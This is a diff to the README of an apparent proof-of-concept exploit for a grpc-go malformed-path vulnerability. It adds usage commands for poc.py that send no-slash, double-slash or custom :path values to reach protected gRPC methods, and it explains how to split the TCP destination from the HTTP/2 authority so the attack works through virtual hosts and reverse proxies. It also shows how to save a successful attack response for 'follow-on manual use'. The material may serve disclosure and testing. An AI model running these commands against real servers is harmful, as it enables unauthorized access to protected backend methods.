@@ -40,7 +40,34 @@ docker compose up --build --abort-on-container-exit
 # Against an existing vulnerable gRPC server:
 python3 poc.py --host <HOST> --port <PORT>
 python3 poc.py --host <HOST> --port <PORT> --service MyService --method SecretMethod
+
+# When TCP destination and HTTP/2 authority differ:
+python3 poc.py --host <VHOST> --connect-host <IP> --port 80 \
+  --service MyService --method SecretMethod
+
+# Canonical upstream malformed path:
+python3 poc.py --host <HOST> --port <PORT> --path-mode no-slash
+
+# Reverse-proxy deployments that preserve a double slash before grpc_pass:
+python3 poc.py --host <VHOST> --connect-host <IP> --port 80 \
+  --path-mode double-slash --service MyService --method SecretMethod
+
+# Literal :path value when you already know the backend path shape:
+python3 poc.py --host <VHOST> --connect-host <IP> --path-mode custom \
+  --attack-path '//MyService/SecretMethod'
+
+# Save a decoded successful attack response for follow-on manual use:
+python3 poc.py --host <HOST> --port <PORT> --output-response /tmp/grpc-response.txt
 ```
+
+`--host` controls the HTTP/2 `:authority` host unless `--authority` is set.
+`--connect-host` controls the TCP destination. This is useful for virtual-host
+or reverse-proxy setups where the reachable IP is different from the routed
+backend authority.
+
+The canonical grpc-go issue is `--path-mode no-slash`. `double-slash` and
+`custom` are generic helpers for environments where a proxy forwards a different
+malformed path shape to the vulnerable backend.
 
 ## Requirements
 
